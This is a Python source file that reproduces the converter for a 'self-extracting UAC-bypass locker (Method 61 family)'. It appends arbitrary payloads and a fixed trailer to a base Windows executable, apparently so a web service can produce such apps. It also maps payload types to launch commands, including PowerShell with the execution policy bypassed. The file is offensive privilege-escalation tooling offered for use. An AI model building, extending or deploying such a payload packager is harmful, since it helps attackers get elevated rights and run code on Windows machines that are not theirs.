"""
uacapp - self-extracting UAC-bypass locker (Method 61 family).
Pure-Python converter: replicates the generator mode of uacapp.c
(file copy + payload append + 112-byte trailer) so the web tier can
produce converted apps without ever executing the Windows PE.

Trailer layout (must match the C struct byte-for-byte):
  BYTE  magic1[16]   "OPENCODE_UACAPP1"
  ULONGLONG offset   base exe length
  ULONGLONG length   payload length
  WCHAR  ext[32]     payload extension, UTF-16LE, zero-padded
  BYTE  magic2[16]   "OPENCODE_UACAPP2"
Total: 16 + 8 + 8 + 64 + 16 = 112 bytes.
"""

from __future__ import annotations

import struct
from pathlib import Path
from typing import BinaryIO

TRAILER_MAGIC1 = b"OPENCODE_UACAPP1"
TRAILER_MAGIC2 = b"OPENCODE_UACAPP2"
TRAILER_SIZE = 112
MAX_PAYLOAD = 50 * 1024 * 1024

EXT_CMD = {
    "bat": 'cmd.exe /c ""%s""',
    "cmd": 'cmd.exe /c ""%s""',
    "ps1": 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%s"',
    "vbs": 'cscript.exe //nologo "%s"',
    "msi": 'msiexec.exe /i "%s"',
}


def ext_to_payload(ext: str) -> str:
    """Return the payload invocation for a given extension (runtime logic)."""
    return EXT_CMD.get(ext.lower(), '"%s"')


def build_trailer(base_len: int, payload_len: int, ext: str) -> bytes:
    """Serialize the 112-byte trailer exactly as uacapp.c writes it."""
    ext_bytes = ext.lower().encode("utf-16-le")[:62]
    ext_padded = (ext_bytes + b"\x00" * 64)[:64]
    return (
        TRAILER_MAGIC1
        + struct.pack("<QQ", base_len, payload_len)
        + ext_padded
        + TRAILER_MAGIC2
    )


def parse_trailer(data: bytes, start: int) -> "tuple[int, int, str] | None":
    """Parse a trailer at offset `start`. Returns (offset, length, ext) or None."""
    if start < TRAILER_SIZE:
        return None
    chunk = data[start - TRAILER_SIZE : start]
    if len(chunk) != TRAILER_SIZE:
        return None
    magic1, offset, length, ext_padded, magic2 = struct.unpack("<16sQQ64s16s", chunk)
    if magic1 != TRAILER_MAGIC1 or magic2 != TRAILER_MAGIC2:
        return None
    ext = ext_padded.decode("utf-16-le").rstrip("\x00")
    return int(offset), int(length), ext


def convert_payload(base_exe: Path | str, payload: bytes, ext: str) -> bytes:
    """Produce the converted app: base exe + payload + trailer."""
    base = Path(base_exe).read_bytes()
    payload_len = len(payload)
    if payload_len > MAX_PAYLOAD:
        raise ValueError(f"payload too large ({payload_len} bytes, max {MAX_PAYLOAD})")
    trailer = build_trailer(len(base), payload_len, ext)
    return base + payload + trailer


def convert_payload_file(base_exe: Path | str, payload_path: Path | str) -> bytes:
    """Convert a payload file on disk; extension comes from the filename."""
    p = Path(payload_path)
    ext = p.suffix.lstrip(".") or "exe"
    with p.open("rb") as f:
        payload = f.read()
    return convert_payload(base_exe, payload, ext)